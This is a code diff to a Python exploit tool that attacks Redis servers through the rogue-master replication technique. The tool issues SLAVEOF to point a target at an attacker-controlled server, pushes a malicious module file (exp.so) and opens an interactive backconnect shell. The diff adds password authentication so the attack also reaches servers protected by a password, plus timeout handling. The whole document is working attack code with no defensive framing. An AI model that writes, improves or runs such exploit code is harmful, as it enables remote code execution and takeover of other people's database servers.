@@ -116,18 +116,22 @@ class RogueServer:
         self._sock.close()
 
     def exp(self):
-        cli, addr = self._sock.accept()
-        back = self._sock.getsockname()
-        print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(back[0], back[1]))
-        while True:
-            data = din(cli, 1024)
-            if len(data) == 0:
-                break
-            resp, phase = self.handle(data)
-            dout(cli, resp)
-            if phase == 3:
-                break
-
+        try:
+            cli, addr = self._sock.accept()
+            back = self._sock.getsockname()
+            print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(back[0], back[1]))
+            self._sock.settimeout(10)
+            while True:
+                data = din(cli, 1024)
+                if len(data) == 0:
+                    break
+                resp, phase = self.handle(data)
+                dout(cli, resp)
+                if phase == 3:
+                    break
+        except Exception as e:
+            print("\033[1;31;m[-]\033[0m Time out, Please check your local address.")
+            exit()
 
 def interact(remote):
     print("\033[92m[+]\033[0m Received backconnect, use exit to exit...")
@@ -150,6 +154,16 @@ def runserver(rhost, rport, lhost, lport):
     # expolit
     expfile = os.path.basename(filename)
     remote = Remote(rhost, rport)
+    if auth:
+        check = remote.do("AUTH {}".format(auth))
+        if "invalid password" in check:
+            print("\033[1;31;m[-]\033[0m Wrong password !")
+            return
+    else:
+        info = remote.do("INFO")
+        if "NOAUTH" in info:
+            print("\033[1;31;m[-]\033[0m Need password.")
+            return
     print("[*] Sending SLAVEOF command to server")
     remote.do("SLAVEOF {} {}".format(lhost, lport))
     back = remote._sock.getsockname()
@@ -187,19 +201,21 @@ def main():
     parser.add_argument("-P", "--lport", dest="lport", type=int,
                         help="rogue server listen port, default 21000", default=21000)
     parser.add_argument("-f", "--file", type=str, help="RedisModules to load, default exp.so", default='exp.so')
+    parser.add_argument("-a", "--auth", dest="auth", type=str, help="redis password")
     parser.add_argument("-v", "--verbose", action="store_true", help="show more info", default=False)
     options = parser.parse_args()
     # runserver("127.0.0.1", 6379, "127.0.0.1", 21000)
 
     print("[*] Connecting to  {}:{}...".format(options.rhost, options.rport))
-    global payload, verbose, filename
+    global payload, verbose, filename, auth
+    auth = options.auth
     filename = options.file
     verbose = options.verbose
     payload = open(filename, "rb").read()
     try:
         runserver(options.rhost, options.rport, options.lhost, options.lport)
     except:
-        print("[-] Error, exit..")
+        print("\033[1;31;m[-]\033[0m Error, exit..")
 
 
 if __name__ == '__main__':
